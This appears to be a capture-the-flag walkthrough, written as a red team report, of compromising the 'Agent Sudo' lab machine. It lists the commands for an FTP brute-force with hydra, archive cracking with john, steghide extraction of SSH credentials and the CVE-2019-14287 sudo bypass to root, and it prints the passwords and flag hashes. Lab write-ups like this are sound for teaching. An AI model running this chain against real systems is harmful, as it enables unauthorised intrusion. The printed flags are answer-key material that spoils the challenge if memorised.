# 🛡️ Red Team Engagement Report: Agent Sudo (Detailed Analysis)

## 1. Executive Summary

This report details a successful red team operation conducted on **July 19, 2025**, resulting in the complete compromise of the host at **10.10.11.80**. The engagement demonstrates how a combination of seemingly minor security flaws—information disclosure, weak credentials, and a vulnerable configuration—can be chained together to achieve full administrative access.

The attack path began with web application enumeration, which revealed a valid system username (`chris`). This information was leveraged to perform a targeted brute-force attack against the exposed FTP service, successfully guessing a weak password. This initial access allowed for the exfiltration of files containing hidden credentials for a second user, which were extracted using steganography. Finally, privilege escalation to root was achieved by exploiting **CVE-2019-14287**, a known vulnerability in a misconfigured sudo policy that was intended to prevent root access.

> 💡 This operation highlights that even simple information leaks can provide the critical first step an attacker needs to unravel an organization's security posture.

---

## 2. Technical Kill Chain Narrative

The attack progressed through a logical sequence of reconnaissance, initial access, and privilege escalation.

### 2.1 Reconnaissance & Initial Enumeration 🕵️

**Objective:** Map the target's attack surface and identify potential entry points.

#### Port Scanning

An Nmap scan of `10.10.11.80` identified three primary services:

- **21/tcp (FTP):** vsftpd 3.0.3  
- **22/tcp (SSH):** OpenSSH 7.6p1  
- **80/tcp (HTTP):** Apache httpd 2.4.29  

#### Web Enumeration

The web server on port 80 presented a message requiring a custom User-Agent. By setting the agent to `"C"`:

```bash
curl -A "C" http://10.10.11.80/
```

A redirect was discovered to a hidden page: `agent_C_attention.php`, which leaked:

> "Attention chris, ... change your god damn password, is weak!"

**Conclusion:** This enumeration phase yielded a valid username (`chris`) and a strong indication of a weak password. The FTP service became the logical target.

---

### 2.2 Initial Access & Foothold 🔑

**Objective:** Convert gathered intelligence into a shell on the target system.

#### Credential Brute-Force

```bash
hydra -t 16 -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.11.80
```

Successfully cracked FTP password: `crystal`.

#### Data Exfiltration and Steganography

Files downloaded from FTP:

- `cutie.png`
- `cute-alien.jpg`
- `To_agentJ.txt`

##### Step A - Find Archive

```bash
binwalk -e cutie.png
```

Revealed a password-protected ZIP archive.

##### Step B - Crack Archive

```bash
zip2john secret.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Password: `alien`

##### Step C - Find Passphrase

Decrypted `To_agentR.txt` containing Base64 string: `QXJlYTUx` → Decodes to: `Area51`

##### Step D - Extract Credentials

```bash
steghide extract -sf cute-alien.jpg -p Area51
```

Message revealed SSH creds: `james:hackerrules!`

#### Establish Shell

```bash
ssh james@10.10.11.80
```

Initial shell acquired as user `james`.

---

### 2.3 Privilege Escalation 🚀

**Objective:** Escalate privileges to root.

#### Check sudo Privileges

```bash
sudo -l
```

Output:

```
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

#### Exploit CVE-2019-14287

```bash
sudo -u#-1 /bin/bash
```

UID `-1` maps to `0` (root) on vulnerable sudo versions, bypassing the `!root` restriction.

#### Access Achieved

Root flag read from `/root/root.txt`. Privilege escalation successful.

---

## 3. Vulnerabilities and Actionable Recommendations

### V-01: Information Disclosure on Web Server (High)

- **Description:** Web application leaked a system username.
- **Recommendation:** Remove debugging info; protect sensitive endpoints with auth.

### V-02: Weak Credentials on Exposed Service (Critical)

- **Description:** FTP user `chris` used weak password `crystal`.
- **Recommendation:** Enforce strong password policy. Disable FTP in favor of SFTP.

### V-03: Insecure Data Storage via Steganography (High)

- **Description:** SSH creds hidden in images.
- **Recommendation:** Use centralized secret storage (e.g., Vault). Never store creds in files.

### V-04: Sudo Privilege Escalation via Misconfiguration (Critical)

- **Description:** Misuse of `!root` in sudoers allowed root via CVE-2019-14287.
- **Recommendation:** 
  - Patch sudo to >= `1.8.28`  
  - Avoid deny-lists. Use strict allow-lists following least privilege.

---

**Flags Captured:**  
- `user.txt`: `b03d975e8c92a7c04146cfa7a5a313c7`  
- `root.txt`: `b53a02f55b57d4439e3341834d70c062`  

---

*Report prepared by: **666** | Red Team Operator*  
*Engagement complete: ✅*
